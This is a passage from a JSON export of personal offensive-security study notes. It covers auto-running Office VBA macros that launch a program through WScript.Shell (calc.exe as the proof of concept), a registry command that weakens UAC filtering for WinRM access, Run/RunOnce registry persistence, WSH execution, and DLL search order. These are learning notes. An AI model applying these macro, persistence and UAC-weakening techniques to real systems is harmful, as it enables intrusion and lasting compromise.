Exploit-VBA-scripts-with-msfvenom","richContent":"&lt;blockquote class=&quot;callout important&quot; data-callout=&quot;important&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Important&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Do not confuse Visual Basic for Applications with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Backdoor-Visual-Basic-Scripts&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Backdoor-Visual-Basic-Scripts&quot;&gt;Visual Basic scripts (.vbs files)&lt;/a&gt;!&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;VBA scripts (“macros”) are a variant of VBScripts designed for use within Microsoft Office. It must be written within the appropriate MS Office app, which I suppose is one reason to shell out for an Office subscription.&lt;/p&gt;\n&lt;p&gt;VBA scripts can be accessed within a document using the &lt;strong&gt;View → Macros → View Macros&lt;/strong&gt; command. This dialog also allows macros to be created, but when doing so be sure to set &lt;strong&gt;Macros in&lt;/strong&gt; to the current document!&lt;/p&gt;\n&lt;p&gt;Macros can be tested during development using the &lt;strong&gt;Run → Run Sub/UserForm&lt;/strong&gt; command in the VBA editor.&lt;/p&gt;\n&lt;p&gt;To get a macro to run when the document is opened requires it to be hooked into the &lt;code&gt;Document_Open()&lt;/code&gt; and &lt;code&gt;AutoOpen()&lt;/code&gt; functions (they &lt;em&gt;almost&lt;/em&gt; do the same thing; including both allows for better backward-compatibility).&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Sub&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; DocumentOpen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tPoC&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;End Sub&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Sub&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; AutoOpen&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;\tPoC&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;End Sub&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Sub&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; PoC&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;()&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t&#039; Create a string variable named `payload`&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;\tDim&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; payload &lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;As&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt; String&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t&#039; Set `payload` to the command we wish to launch&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\tpayload&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;calc.exe&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;\t&#039; Fire!&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\tCreateObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Wscript.Shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;.Run payload,&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;End Sub&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Note that .docx files &lt;em&gt;cannot&lt;/em&gt; include macros anymore — either a .docxm file needs to be used or the older .doc format. It’s generally better to use .doc, as the .docxm icon is noticeably different from that of a standard Word document. (All of these notes also apply to other Office formats, obviously…)&lt;/p&gt;\n&lt;p&gt;Running an application using VBA Script is fundamentally the same as with the other methods — we invoke &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Windows-Scripting-Host&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Windows-Scripting-Host&quot;&gt;WSH&lt;/a&gt;. As with WSH, I’ve found that recent versions of Windows seem to greatly restrict what can be launched using WSH via Office macros… I’ve managed to pop calc.exe, but not anything else!&lt;/p&gt;\n&lt;h2 id=&quot;create-malicious-vba-macros-using-metasploit&quot;&gt;Create malicious VBA macros using Metasploit&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#create-malicious-vba-macros-using-metasploit&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Exploit-VBA-scripts-with-msfvenom&quot; data-block=&quot;&quot; data-embed-alias=&quot;Exploit VBA scripts with msfvenom&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Exploit-VBA-scripts-with-msfvenom&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Exploit-VBA-scripts-with-msfvenom&quot;&gt;Transclude of Exploit-VBA-scripts-with-msfvenom&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Wi-Fi":{"slug":"spells/Wi-Fi","filePath":"spells/Wi-Fi.md","title":"Wi-Fi","links":["spells/MAC-address"],"tags":["Protocol/WiFi","Hardware/MACAddress"],"content":"\nSSID — The wireless network “display” name.\nBSSID — The MAC address of the access point currently being used.\nESSID — A collection of BSSIDs representing a single network. More-or-less analogous to SSID (when used in the context of networks consisting of multiple access points).\n\nFrom what I can tell, SSID and BSSID apply to single access points, while ESSID applies to an entire network of access points.","richContent":"&lt;ul&gt;\n&lt;li&gt;SSID — The wireless network “display” name.&lt;/li&gt;\n&lt;li&gt;BSSID — The &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/MAC-address&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/MAC-address&quot;&gt;MAC address&lt;/a&gt; of the access point currently being used.&lt;/li&gt;\n&lt;li&gt;ESSID — A collection of BSSIDs representing a single network. More-or-less analogous to SSID (when used in the context of networks consisting of multiple access points).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;From what I can tell, SSID and BSSID apply to single access points, while ESSID applies to an entire network of access points.&lt;/p&gt;"},"spells/Windows-DLL-search-order":{"slug":"spells/Windows-DLL-search-order","filePath":"spells/Windows DLL search order.md","title":"Windows DLL search order","links":[],"tags":["OS/Windows","Application/ProcMon"],"content":"The search order varies depending on the state of SafeDllSearchMode.\nWindows DLL search order if SafeDllSearchMode is enabled:\n\nThe application directory\nThe system directory (as returned by GetSystemDirectory())\nThe 16-bit (!) system directory\nThe Windows directory (as returned by GetWindowsDirectory())\nThe current directory (!)\nThe system PATH (!)\n\nWindows DLL search order if SafeDllSearchMode is disabled:\n\nThe application directory\nThe current directory (!)\nThe system directory (as returned by GetSystemDirectory())\nThe 16-bit (!) system directory\nThe Windows directory (as returned by GetWindowsDirectory())\nThe system PATH (!)\n\nNote that it seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run).","richContent":"&lt;p&gt;The search order varies depending on the state of SafeDllSearchMode.&lt;/p&gt;\n&lt;p&gt;Windows DLL search order if SafeDllSearchMode is enabled:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;The application directory&lt;/li&gt;\n&lt;li&gt;The system directory (as returned by &lt;code&gt;GetSystemDirectory()&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;The 16-bit (!) system directory&lt;/li&gt;\n&lt;li&gt;The Windows directory (as returned by &lt;code&gt;GetWindowsDirectory()&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;The current directory (!)&lt;/li&gt;\n&lt;li&gt;The system PATH (!)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Windows DLL search order if SafeDllSearchMode is disabled:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;The application directory&lt;/li&gt;\n&lt;li&gt;The current directory (!)&lt;/li&gt;\n&lt;li&gt;The system directory (as returned by &lt;code&gt;GetSystemDirectory()&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;The 16-bit (!) system directory&lt;/li&gt;\n&lt;li&gt;The Windows directory (as returned by &lt;code&gt;GetWindowsDirectory()&lt;/code&gt;)&lt;/li&gt;\n&lt;li&gt;The system PATH (!)&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that it seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run).&lt;/p&gt;"},"spells/Windows-Remote-Management":{"slug":"spells/Windows-Remote-Management","filePath":"spells/Windows Remote Management.md","title":"Windows Remote Management","links":["spells/HTTP","spells/TCP","spells/winrs","spells/Use-WinRM-with-PowerShell","spells/Evil-WinRM"],"tags":["Application/PowerShell","OS/Windows/Registry","OS/Windows/UAC","AttackCycle/LateralMovement","Protocol/WinRM"],"content":"\n\n                  \n                  Warning\n                  \n                \n\n\nBy default, UAC restricts WinRM calls to domain admins and the default local “Administrator” account. Local Windows admins cannot call this service without first disabling UAC!\n\n\n\n\n\n                  \n                  Tip\n                  \n                \n\n\nAdmin-ish privileges (including privileges associated with the Backup Operators group) are stripped by default when using WinRM. To enable this access, we need to set the LocalAccountTokenFilterPolicy registry key to 1.\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1\n\n\n\nWindows Remote Management (WinRM) is basically PowerShell-over-HTTP. It requires access to TCP 5985 (unencrypted) or TCP 5986 (encrypted).\nWinRS\nTransclude of winrs\nPowerShell\nTransclude of Use-WinRM-with-PowerShell\nEvil-WinRM\nTransclude of Evil-WinRM","richContent":"&lt;blockquote class=&quot;callout warning&quot; data-callout=&quot;warning&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Warning&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;By default, UAC restricts WinRM calls to domain admins and the default local “Administrator” account. &lt;em&gt;Local Windows admins cannot call this service without first disabling UAC!&lt;/em&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;Admin-ish privileges (including privileges associated with the Backup Operators group) are stripped by default when using WinRM. To enable this access, we need to set the LocalAccountTokenFilterPolicy registry key to 1.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;powershell&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;t REG_DWORD &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;v LocalAccountTokenFilterPolicy &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;d &lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;Windows Remote Management (WinRM) is basically PowerShell-over-&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt;. It requires access to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 5985 (unencrypted) or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; 5986 (encrypted).&lt;/p&gt;\n&lt;h2 id=&quot;winrs&quot;&gt;WinRS&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#winrs&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;winrs&quot; data-block=&quot;&quot; data-embed-alias=&quot;winrs&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/winrs&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/winrs&quot;&gt;Transclude of winrs&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;powershell&quot;&gt;PowerShell&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#powershell&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Use-WinRM-with-PowerShell&quot; data-block=&quot;&quot; data-embed-alias=&quot;Use WinRM with PowerShell&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Use-WinRM-with-PowerShell&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Use-WinRM-with-PowerShell&quot;&gt;Transclude of Use-WinRM-with-PowerShell&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;\n&lt;h2 id=&quot;evil-winrm&quot;&gt;Evil-WinRM&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#evil-winrm&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;/p&gt;&lt;blockquote class=&quot;transclude&quot; data-url=&quot;Evil-WinRM&quot; data-block=&quot;&quot; data-embed-alias=&quot;Evil-WinRM&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Evil-WinRM&quot; class=&quot;transclude-inner internal alias&quot; data-slug=&quot;spells/Evil-WinRM&quot;&gt;Transclude of Evil-WinRM&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;/p&gt;"},"spells/Windows-Run-and-RunOnce-Registry-keys":{"slug":"spells/Windows-Run-and-RunOnce-Registry-keys","filePath":"spells/Windows Run and RunOnce Registry keys.md","title":"Windows Run and RunOnce Registry keys","links":[],"tags":["OS/Windows/Registry"],"content":"Startup programs can also be configured in the registry:\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce \n\nHKCU applies to the current user, while HLKM applies to everyone.\nEntries under Run will run every time the user logs on, while those under RunOnce will only be executed a single time.\nCreate a REG_EXPAND_SZ registry entry under the appropriate key that points to the appropriate payload.","richContent":"&lt;p&gt;Startup programs can also be configured in the registry:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&lt;/code&gt;&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce &lt;/code&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;HKCU applies to the current user, while HLKM applies to everyone.&lt;/p&gt;\n&lt;p&gt;Entries under Run will run every time the user logs on, while those under RunOnce will only be executed a single time.&lt;/p&gt;\n&lt;p&gt;Create a &lt;code&gt;REG_EXPAND_SZ&lt;/code&gt; registry entry under the appropriate key that points to the appropriate payload.&lt;/p&gt;"},"spells/Windows-Scripting-Host":{"slug":"spells/Windows-Scripting-Host","filePath":"spells/Windows Scripting Host.md","title":"Windows Scripting Host","links":["spells/Backdoor-Visual-Basic-Scripts"],"tags":["OS/Windows/WSH","Language/VisualBasic","AttackCycle/Exploitation"],"content":"The Windows Scripting Host (WSH) consists of two tools, cscript.exe for command-line scripts and wscript.exe for UI scripts, and executes Visual Basic scripts (though it doesn’t care about the extension). WSH operates with regular user privileges, not admin privileges.\nAn example VBScript:\nDim message                &#039; Create the variable message\nmessage = &quot;Welcome to THM&quot; &#039; Set the variable message\nMsgBox message             &#039; Display message using a pop-up dialog\nExecuting a program requires creating a “shell” object:\nSet shell = WScript.CreateObject(&quot;Wscript.Shell&quot;)\n \n&#039; Note the space after calc.exe! This is required because of\n&#039; some weird interactions between wscript.exe/cscript.exe and\n&#039; the VB runtime. Alternately, TRIPLE double quotes can be\n&#039; used instead.\nshell.Run(&quot;C:\\Windows\\System32\\calc.exe &quot; &amp; WScript.ScriptFullName),0,True\n \n&#039; Alternate way to call calc.exe.\nshell.Run(&quot;&quot;&quot;C:\\Windows\\System32\\calc.exe&quot;&quot;&quot; &amp; WScript.ScriptFullName),0,True\nIt appears that recent versions of Windows may severely limit which binaries can be called from the wscript.Shell object; calc.exe works, but pretty much nothing else does.","richContent":"&lt;p&gt;The Windows Scripting Host (WSH) consists of two tools, cscript.exe for command-line scripts and wscript.exe for UI scripts, and executes &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Backdoor-Visual-Basic-Scripts&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Backdoor-Visual-Basic-Scripts&quot;&gt;Visual Basic scripts&lt;/a&gt; (though it doesn’t care about the extension). WSH operates with &lt;em&gt;regular user privileges&lt;/em&gt;, not admin privileges.&lt;/p&gt;\n&lt;p&gt;An example VBScript:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Dim&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; message                &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; Create the variable message&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;message&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Welcome to THM&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt; &#039; Set the variable message&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;MsgBox&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; message             &lt;/span&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; Display message using a pop-up dialog&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Executing a program requires creating a “shell” object:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;vb&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt;Set &lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; =&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; WScript.&lt;/span&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;CreateObject&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;Wscript.Shell&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; Note the space after calc.exe! This is required because of&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;&#039; some weird interactions between wscript.exe/cscript.exe 